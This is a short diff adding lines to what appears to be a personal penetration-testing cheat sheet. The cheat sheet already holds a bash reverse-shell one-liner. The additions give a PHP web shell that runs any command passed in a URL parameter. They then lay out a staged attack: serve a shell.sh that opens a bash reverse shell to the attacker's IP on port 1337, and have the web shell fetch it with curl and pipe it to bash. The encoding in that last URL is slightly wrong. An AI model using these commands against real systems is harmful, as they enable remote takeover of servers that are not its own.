@@ -39,3 +39,13 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 #bash shell
 #!/bin/bash
 bash -i >& /dev/tcp/IP/port 0>&1
+
+#for a web shell php
+<?php system($_GET["cmd"]); ?>
+# to visit it by, http://***.**/**shell.php?cmd=**
+#further use it to run a bash shell
+#create a python httpserver, maybe 8000 port, a shell.sh like
+    #!/bin/bash
+    bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+under the server dirc
+#on the attack host, http://***.**/**shell.php?cmd=curl%30<httpserverIP>:8000/shell.sh|bash
